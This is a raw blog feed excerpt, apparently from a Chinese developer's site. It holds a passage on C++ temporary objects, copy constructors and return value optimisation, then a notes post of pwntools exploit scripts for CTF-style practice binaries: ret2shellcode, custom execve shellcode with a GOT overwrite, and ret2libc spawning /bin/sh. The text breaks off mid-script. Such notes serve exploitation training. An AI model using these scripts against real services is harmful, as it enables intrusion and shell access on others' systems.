class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Entity</span>() &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Default constructor\t&quot;</span> &lt;&lt; <span class="keyword">this</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">Entity</span>(<span class="type">int</span> x) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Parameter constructor\t&quot;</span> &lt;&lt; <span class="keyword">this</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">Entity</span>(<span class="type">const</span> Entity&amp; other) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="keyword">this</span> &lt;&lt; <span class="string">&quot;Copy&quot;</span> &lt;&lt; &amp;other &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Entity</span>() &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Destructor function\t&quot;</span> &lt;&lt; <span class="keyword">this</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    Entity&amp; <span class="keyword">operator</span>=(<span class="type">const</span> Entity&amp; other) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="keyword">this</span> &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; &amp;other &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>测试代码及测试结果将根据不同情况分开处理</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(Entity e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;fun()...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fun</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Parameter constructor   0xc2a39ffbbf</span><br><span class="line">fun()...</span><br><span class="line">Destructor function     0xc2a39ffbbf</span><br></pre></td></tr></table></figure><p>直接用参数传递对象时并不会先产生临时对象，再拷贝构造，而是类似于<code>Entity e = 1</code>隐式使用有参构造。</p><p>下面看一下同样的<code>fun()</code>函数但是不同的调用方式会有什么不一样的结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Entity <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Entity e;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Entity e1;</span><br><span class="line">    e1 = <span class="built_in">fun</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Default constructor     0xc42fdff88e // e1</span><br><span class="line">Default constructor     0xc42fdff83f // e</span><br><span class="line">Copy constructor        0xc42fdff88f // tmp</span><br><span class="line">0xc42fdff88f Copy 0xc42fdff83f // tmp copy e</span><br><span class="line">Destructor function     0xc42fdff83f // e</span><br><span class="line">0xc42fdff88e = 0xc42fdff88f e1 = tmp</span><br><span class="line">Destructor function     0xc42fdff88f // tmp</span><br><span class="line">Destructor function     0xc42fdff88e // e1</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Entity e1 = <span class="built_in">fun</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Default constructor     0xf880fff84f // e</span><br><span class="line">Copy constructor        0xf880fff89f // e1</span><br><span class="line">0xf880fff89f Copy 0xf880fff84f // e1 copy e</span><br><span class="line">Destructor function     0xf880fff84f // e</span><br><span class="line">Destructor function     0xf880fff89f // e1</span><br></pre></td></tr></table></figure><p>区别就在于<code>e1</code>对象在一开始有没有被创建</p><p>第一种情况，先无参构造出了<code>e1</code>，在用等号赋值时产生了临时对象<code>tmp</code>。</p><p>第二种情况，<code>e1</code>一开始没有被创建。这种情况下，是隐式的调用拷贝构造函数，等同于<code>Entity e1(fun())</code>，这里应该是没有问题的。我猜测，拷贝构造不会产生临时对象所以这里直接以<code>e</code>作为<code>e1</code>的拷贝对象</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Entity <span class="title">fun2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Entity <span class="title">e</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;fun2()...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;before fun2()...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">fun2</span>();</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;after fun2()...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">before fun2()...</span><br><span class="line">Parameter constructor   0xe7aa9ffa9f // e</span><br><span class="line">fun2()...</span><br><span class="line">Copy constructor        0xe7aa9ffaef // tmp</span><br><span class="line">0xe7aa9ffaef Copy 0xe7aa9ffa9f // tmp copy  e</span><br><span class="line">Destructor function     0xe7aa9ffa9f</span><br><span class="line">Destructor function     0xe7aa9ffaef</span><br><span class="line">after fun2()...</span><br></pre></td></tr></table></figure><p>只是简单的调用，也会在主函数产生临时对象</p><p>下面是比较综合例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun1</span><span class="params">(Entity e3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;fun1()...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Entity <span class="title">fun2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Entity <span class="title">e</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;fun2()...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Entity <span class="title">e1</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line">    Entity e2 = e1;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;before fun1()...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">fun1</span>(e1);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;after fun1()...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;before fun2()...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    Entity e4 = <span class="built_in">fun2</span>();</span><br><span class="line">    e4 = <span class="built_in">fun2</span>();</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;after fun2()...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Parameter constructor   0xf0d1bffbad // e1</span><br><span class="line">Copy constructor        0xf0d1bffbac // e2</span><br><span class="line">0xf0d1bffbac Copy 0xf0d1bffbad // e2 copy e1</span><br><span class="line">before fun1()...</span><br><span class="line">Copy constructor        0xf0d1bffbae // e3</span><br><span class="line">0xf0d1bffbae Copy 0xf0d1bffbad // e3 copy e1</span><br><span class="line">fun1()...</span><br><span class="line">Destructor function     0xf0d1bffbae // e3</span><br><span class="line">after fun1()...</span><br><span class="line">before fun2()...</span><br><span class="line">Parameter constructor   0xf0d1bffb5f // e</span><br><span class="line">fun2()...</span><br><span class="line">Copy constructor        0xf0d1bffbab // e4</span><br><span class="line">0xf0d1bffbab Copy 0xf0d1bffb5f e4 copy e</span><br><span class="line">Destructor function     0xf0d1bffb5f // e</span><br><span class="line">Parameter constructor   0xf0d1bffb5f // e</span><br><span class="line">fun2()...</span><br><span class="line">Copy constructor        0xf0d1bffbaf // tmp</span><br><span class="line">0xf0d1bffbaf Copy 0xf0d1bffb5f tmp copy e</span><br><span class="line">Destructor function     0xf0d1bffb5f // e</span><br><span class="line">0xf0d1bffbad = 0xf0d1bffbaf // e4 = tmp</span><br><span class="line">Destructor function     0xf0d1bffbaf // tmp</span><br><span class="line">after fun2()...</span><br><span class="line">Destructor function     0xf0d1bffbab // e4</span><br><span class="line">Destructor function     0xf0d1bffbac // e2</span><br><span class="line">Destructor function     0xf0d1bffbad // e1</span><br></pre></td></tr></table></figure><p>接下来看一下，在<code>RVO</code>的情况下会发生什么有趣的事情</p><p>编译命令改为：<code>g++ test.cpp -o test</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Entity <span class="title">fun2</span><span class="params">(Entity e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;fun2()...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="function">Entity <span class="title">e3</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;e3 Address: &quot;</span> &lt;&lt; &amp;e3 &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> e3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Entity e1;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;before fun2()...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    Entity e2 = <span class="built_in">fun2</span>(<span class="number">1</span>);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;after fun2()...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;e2 Address: &quot;</span> &lt;&lt; &amp;e2 &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Default constructor     0xb95e1ff61e // e1</span><br><span class="line">before fun2()...</span><br><span class="line">Parameter constructor   0xb95e1ff61f // e</span><br><span class="line">fun2()...</span><br><span class="line">Parameter constructor   0xb95e1ff61d // e3</span><br><span class="line">e3 Address: 0xb95e1ff61d</span><br><span class="line">Destructor function     0xb95e1ff61f // e</span><br><span class="line">after fun2()...</span><br><span class="line">e2 Address: 0xb95e1ff61d</span><br><span class="line">Destructor function     0xb95e1ff61d // e3</span><br><span class="line">Destructor function     0xb95e1ff61e // e1</span><br></pre></td></tr></table></figure><p>发现<code>e2</code>的地址竟然跟<code>e3</code>一样，为什么呢？以下是我的猜测</p><p>编译器发现，最后返回的时候，<code>e2</code>跟<code>e3</code>是几乎是同时创建而且完完全全一模一样的，反正<code>e3</code>最后都是要销毁的，那为什么不直接把<code>e3</code>的内存交给<code>e2</code>呢？所以，在生成汇编代码时，并没有给<code>e3</code>分配内存，对e3的操作就是直接在<code>e2</code>的内存上进行的</p><p>这种操作只有在类型为对象时会发生，如果是基本数据类型的话就是比较一般的拷贝操作</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/nbu_dahe/article/details/119142610">C++ 函数返回对象时并没有调用拷贝构造函数_在初始化列表中未调用拷贝构造函数-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_22660775/article/details/89854545">C++：函数返回值与临时变量_.c++中将临时变量作为返回值的写法-CSDN博客</a></p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>了解临时变量产生的机制，可以让我们在生产中避免不必要的性能开销。对C++的运行机制也会更加了解。此外，我还发现，形参变量的地址与函数中局部变量的地址似乎并不在同一栈帧上。。。（有待考究</p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-exp记录</title>
      <link href="/2024/02/04/pwn-exp/"/>
      <url>/2024/02/04/pwn-exp/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 1 &lt;dofunc&gt; rbp  0x7ffc90810070 —▸ 0x7ffc90810080 ◂— 1</span><br><span class="line"># 2 &lt;dofunc&gt; rbp  0x7ffc9080ff60 —▸ 0x7ffc9080ff70 —▸ 0x7fd8bc7172c0 ◂— 0</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;puts&#x27;</span>])) <span class="comment"># 0x10d4 —▸ puts@plt</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf.sym[<span class="string">&#x27;puts&#x27;</span>]))     <span class="comment"># 0x10d4 —▸ puts@plt</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))     <span class="comment"># 0x10d4 —▸ puts@plt</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>]))     <span class="comment"># 0x3f90 —▸ puts@GLIBC</span></span><br><span class="line"></span><br><span class="line">.plt</span><br><span class="line"><span class="number">0x10d4</span>    puts@plt</span><br><span class="line"></span><br><span class="line">.got</span><br><span class="line"><span class="number">0x3f90</span>    puts@GLIBC</span><br></pre></td></tr></table></figure><p><strong>ret2shellcode</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./question_6_1_x64&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">io = process(pwnfile)</span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&#x27;input:\n&#x27;</span></span><br><span class="line">sh = shellcraft.sh() <span class="comment"># class_string 汇编指令字符串</span></span><br><span class="line">payload = asm(sh) <span class="comment"># 将汇编指令汇编成机器码</span></span><br><span class="line">io.sendafter(delim, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./question_6_3_x64&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">io = process(pwnfile)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;set context-output /dev/pts/6&quot;)</span></span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&#x27;input:\n&#x27;</span></span><br><span class="line">sh = shellcraft.sh() <span class="comment"># class_string 汇编指令字符串</span></span><br><span class="line">padding = cyclic(<span class="number">0x110</span> + <span class="number">8</span> - <span class="built_in">len</span>(asm(sh))) <span class="comment"># $rbp - $rsi = 0x110</span></span><br><span class="line">ret = elf.symbols[<span class="string">&#x27;buf2&#x27;</span>]</span><br><span class="line">payload = flat([asm(sh), padding, ret])</span><br><span class="line">io.sendafter(delim, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(pwnfile) </span><br><span class="line"><span class="comment"># io = remote(&quot;10.1.178.37&quot;, 9999)</span></span><br><span class="line"></span><br><span class="line">script = <span class="string">&quot;&quot;&quot;set context-output /dev/pts/4&quot;&quot;&quot;</span></span><br><span class="line">gdb.attach(io,script)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">exit_got = elf.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 共 0x15 个字节,算上xor rdx, rdx共 0x18 个字节</span></span><br><span class="line">sh = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">//xor rdx, rdx 原题rdx已经是0了,省了3个字节</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload1 = asm(sh)</span><br><span class="line">io.send(payload1)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x405000</span></span><br><span class="line">num = sh_addr &amp; <span class="number">0xffff</span></span><br><span class="line">payload2 = flat([num, exit_got, <span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] exit@got:&quot;</span>, <span class="built_in">hex</span>(exit_got))</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>re2libc</strong></p><p>在x86的情况下，直接通过栈传参泄露地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line">libc = <span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">libc = ELF(libc)</span><br><span class="line">write_offset = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_offset = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;./question_5_x86&quot;</span></span><br><span class="line">proc = process(target)</span><br><span class="line">target = ELF(target)</span><br><span class="line"></span><br><span class="line">write_got = target.got[<span class="string">&#x27;write&#x27;</span>] <span class="comment"># write@got这个内存单元在内存中的地址</span></span><br><span class="line"></span><br><span class="line">padding = cyclic(<span class="number">0x14</span>)</span><br><span class="line">write_plt = target.symbols[<span class="string">&#x27;write&#x27;</span>] <span class="comment"># write@plt这个函数在内存中的地址</span></span><br><span class="line">ret = target.symbols[<span class="string">&#x27;dofunc&#x27;</span>] <span class="comment"># dofunc这个函数在内存中的地址</span></span><br><span class="line">arg1 = <span class="number">1</span></span><br><span class="line">arg2 = write_got</span><br><span class="line">arg3 = <span class="number">4</span></span><br><span class="line">payload = flat([padding, write_plt, ret, arg1, arg2, arg3])</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">delim = <span class="string">&quot;input:&quot;</span></span><br><span class="line">proc.sendlineafter(delim, payload)</span><br><span class="line">proc.recvuntil(<span class="string">b&quot;byebye&quot;</span>)</span><br><span class="line">write_libc = u32(proc.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = write_libc - write_offset</span><br><span class="line">system_libc = libc_base + system_offset</span><br><span class="line">bin_sh_addr = libc_base + bin_sh_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;libc_base&gt;:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;write@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(write_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;system@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(system_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;/bin/sh&gt;:&quot;</span>, <span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload2 = flat([padding, system_libc, <span class="number">0xdeadbeef</span>, bin_sh_addr])</span><br><span class="line">proc.sendlineafter(delim, payload2)</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span 